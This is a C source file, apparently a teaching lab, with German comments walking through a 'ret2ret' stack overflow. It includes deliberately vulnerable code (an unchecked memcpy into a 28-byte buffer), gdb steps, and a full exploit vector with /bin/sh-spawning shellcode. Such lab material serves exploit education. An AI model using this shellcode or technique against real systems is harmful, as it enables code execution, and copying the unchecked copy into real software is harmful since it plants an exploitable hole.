/* 
   1. gcc -fno-stack-protector -no-pie  -z execstack -m32 -o ret2ret ret2ret.c 
   2. Ruecksprungaddresse im Stack suchen
      - gdb -q ret2ret 
      - r $(python -c 'print("A"*40 + "B"*4)')

      Es sollte ein Absturz erfolgen der Art:
      Program received signal SIGSEGV, Segmentation fault.
          0x42424242 in ?? ()
      -> es wurde versucht "BBBB" als raddr zu verwenden
      -> hier müssen wir nachher ansetzen
    3. Suche der Anfangsadresse des Buffers
      - gdb -q ret2ret 
      - Setze breakpoint auf "ret" in "vuln"
          * disass vuln 
             0x0804848e <+56>:	ret    
          * break *0x0804848e
      - r $(python -c 'print("A"*40 + "B"*4)')
      - Gebe wenn der Breakpoint greift den Stack aus: 
        x /10wx $esp
        -> Ueber den "BBBB" = "0x42424242" liegt der Pointer auf unseren Buffer
        x/s ADDR
           0xbffff3ee:	'A' <repeats 40 times>, "BBBB"
    4. Baue nun einen Angriffsvektor -> little endian
      - Shellcode kann in die 40 Bytes mit den 'A' (mit NOPs 0x90 auffüllen)
      - Anstelle der 'B' setzen wir die Adresse des ret ein, also 0x0804848e  
        -> hierdurch wird ret 2x ausgeführt
        -> beim 2.ret wird der Bufferzeiger als Ruecksprungadresse verwendet 
   5. Baue nun einen Angriffsvektor -> little endian
      - Nehme shellcode (32 Bytes) aus testshellcode.c, fülle mit 8 Bytes NOPs auf
      - am Ende noch die Adresse von ret eintragen, also 0x0804848e

      export vec=$'\x31\xc0\x50\xeb\x0e\x8b\x1c\x24\x88\x43\x07\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x30\x90\x90\x90\x90\x90\x90\x90\x90\x8e\x84\x04\x08'

   4. ./ret2ret $vec
*/

#include <stdio.h>
#include <string.h>

void vuln(char *buffer) {
   char buf[28];
   memcpy(buf, buffer, strlen(buffer));
}

int main(int agrc, char **argv) {
   vuln( argv[1] );
   return 0;
}
